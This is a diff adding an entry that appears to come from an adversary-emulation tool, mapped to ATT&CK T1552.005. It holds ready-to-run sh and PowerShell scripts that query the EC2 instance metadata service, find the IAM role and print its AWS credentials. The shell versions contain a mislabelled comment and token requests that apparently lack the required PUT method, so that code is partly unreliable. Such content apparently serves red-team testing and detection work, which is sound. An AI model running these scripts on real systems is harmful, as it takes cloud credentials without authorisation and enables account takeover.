@@ -1,0 +1,89 @@
+---
+- id: aws-cred-002
+  name: Harvest Instance Metadata Credentials
+  description: Extract AWS credentials from EC2 instance metadata service
+  tactic: credential-access
+  technique:
+    attack_id: T1552.005
+    name: Cloud Instance Metadata API
+  platforms:
+    darwin:
+      sh:
+        command: |
+          echo "[+] Attempting to access EC2 instance metadata:"
+          # Try IMDSv1 first
+          TOKEN=$(curl -s -m 2 --connect-timeout 2 http://169.254.169.254/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null)
+          if [ $? -eq 0 ] && [ ! -z "$TOKEN" ]; then
+            echo "[+] IMDSv2 token obtained"
+            ROLE=$(curl -s -m 2 -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null)
+          else
+            echo "[+] Trying IMDSv1 (fallback):"
+            ROLE=$(curl -s -m 2 --connect-timeout 2 http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null)
+          fi
+          
+          if [ ! -z "$ROLE" ]; then
+            echo "[+] Found IAM role: $ROLE"
+            if [ ! -z "$TOKEN" ]; then
+              curl -s -m 2 -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE 2>/dev/null
+            else
+              curl -s -m 2 --connect-timeout 2 http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE 2>/dev/null
+            fi
+          else
+            echo "[-] Not running on EC2 instance or no metadata access"
+          fi
+    linux:
+      sh:
+        command: |
+          echo "[+] Attempting to access EC2 instance metadata:"
+          # Try IMDSv2 first
+          TOKEN=$(curl -s -m 2 --connect-timeout 2 http://169.254.169.254/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null)
+          if [ $? -eq 0 ] && [ ! -z "$TOKEN" ]; then
+            echo "[+] IMDSv2 token obtained"
+            ROLE=$(curl -s -m 2 -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null)
+          else
+            echo "[+] Trying IMDSv1 (fallback):"
+            ROLE=$(curl -s -m 2 --connect-timeout 2 http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null)
+          fi
+          
+          if [ ! -z "$ROLE" ]; then
+            echo "[+] Found IAM role: $ROLE"
+            if [ ! -z "$TOKEN" ]; then
+              curl -s -m 2 -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE 2>/dev/null
+            else
+              curl -s -m 2 --connect-timeout 2 http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE 2>/dev/null
+            fi
+          else
+            echo "[-] Not running on EC2 instance or no metadata access"
+          fi
+    windows:
+      psh,pwsh:
+        command: |
+          try {
+            Write-Host "[+] Attempting to access EC2 instance metadata:"
+            # Try IMDSv2 first
+            $headers = @{"X-aws-ec2-metadata-token-ttl-seconds" = "21600"}
+            $token = Invoke-RestMethod -Uri "http://169.254.169.254/latest/api/token" -Method PUT -Headers $headers -TimeoutSec 2 -ErrorAction SilentlyContinue
+            
+            if ($token) {
+              Write-Host "[+] IMDSv2 token obtained"
+              $tokenHeaders = @{"X-aws-ec2-metadata-token" = $token}
+              $role = Invoke-RestMethod -Uri "http://169.254.169.254/latest/meta-data/iam/security-credentials/" -Headers $tokenHeaders -TimeoutSec 2 -ErrorAction SilentlyContinue
+            } else {
+              Write-Host "[+] Trying IMDSv1 (fallback):"
+              $role = Invoke-RestMethod -Uri "http://169.254.169.254/latest/meta-data/iam/security-credentials/" -TimeoutSec 2 -ErrorAction SilentlyContinue
+            }
+            
+            if ($role) {
+              Write-Host "[+] Found IAM role: $role"
+              if ($token) {
+                $creds = Invoke-RestMethod -Uri "http://169.254.169.254/latest/meta-data/iam/security-credentials/$role" -Headers $tokenHeaders -TimeoutSec 2
+              } else {
+                $creds = Invoke-RestMethod -Uri "http://169.254.169.254/latest/meta-data/iam/security-credentials/$role" -TimeoutSec 2
+              }
+              $creds | ConvertTo-Json -Depth 3
+            } else {
+              Write-Host "[-] Not running on EC2 instance or no metadata access"
+            }
+          } catch {
+            Write-Host "[-] Error accessing instance metadata: $($_.Exception.Message)"
+          }
